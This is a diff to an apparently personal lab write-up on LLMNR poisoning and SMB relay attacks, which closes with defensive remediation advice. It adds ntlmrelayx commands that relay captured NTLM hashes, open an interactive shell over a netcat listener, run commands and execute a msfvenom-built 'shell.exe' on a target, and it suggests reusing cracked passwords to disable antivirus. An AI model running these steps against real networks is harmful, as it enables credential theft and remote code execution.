@@ -45,11 +45,12 @@ Note: We are looking for SMB signing _not required_ for this to work.  Also, not
 
 <img width="700" height="500" alt="image4" src="https://user-images.githubusercontent.com/76034874/187007262-4d503d3c-80fa-4744-8a6f-5baab830b309.png">
 
+#### Let's start a tool called `ntlmrelayx` on our attackbox 
+Syntax: `ntlmrelayx.py -tf targets.txt -smb2support`
 
 #### Login in to the Windows machine and try to access a share we know is invalid on the network, our eth0: \\\10.0.2.30
 <img width="807" alt="Screen Shot 2022-08-28 at 4 50 59 PM" src="https://user-images.githubusercontent.com/76034874/187099849-3124a8c9-e6f5-4a02-8f6b-cd5920650f42.png">
 
-#### syntax: `ntlmrelayx.py -tf targets.txt -smb2support`
 #### We can see the hashes come through. We can either crack these or relay them.  Sometimes we find password reuse.  For example the same password found here could be used to log into the anti-virus program (so we could disable it) or another client on the network.
 ![image](https://user-images.githubusercontent.com/76034874/187008490-680f5243-efc4-4a78-b269-2558b2188c1b.png)
 
@@ -58,8 +59,10 @@ Note: We are looking for SMB signing _not required_ for this to work.  Also, not
 syntax: `ntlmrelayx.py -tf targets.txt -smb2support -i`
 ![image](https://user-images.githubusercontent.com/76034874/187008783-7a4a8830-4796-495e-b1a1-8efafd69e439.png)
 
-#### Now we start a netcat listener in another terminal on our attack box at 127.0.0.1 11002 and we open up to a shell. Type 'help' to see a list of commands.  We can upload or download files with `get` and `put`.  We could upload our own reverse shell or run any windows command in the ntlmrelay command line.
-
+#### Now we start a netcat listener in another terminal on our attack box at 127.0.0.1 11002 and we open up to a shell. Type 'help' to see a list of commands.  We can upload or download files with `get` and `put`.  We could run most windows commands in the ntlmrelay command line or upload our own reverse shell. For example:
+Syntax: `ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"`
+`ntlmrelayx.py -tf targets.txt -smb2support -e "shell.exe"`
+***Used with msfconsole and msfvenom***
 
 ![image](https://user-images.githubusercontent.com/76034874/187009309-f8dca5d0-8da0-4e4f-a705-6d289d1bae30.png)
 <img width = "774" alt="image2" src="https://user-images.githubusercontent.com/76034874/187009336-bf0f7849-c3e3-4fa8-a88a-d0e40abb8f4b.png">
@@ -68,7 +71,15 @@ syntax: `ntlmrelayx.py -tf targets.txt -smb2support -i`
 
 ## LET'S TALK REMEDIATION
 
-### Here is the current guidance on patching this security flaw:
+### LLMNR ATTACKS
+> Defenses against this attack:
+>
+> Disable LLMNR
+> - If not possible: Require Network Access Control
+> - Require Strong User Passwords: >14 chars and avoid common words
+
+
+### SMB Relay Attacks - "Pass the hash"
 
 > #### Enable and Require SMB Signing on all devices
 >	- Pro: Stops the attack
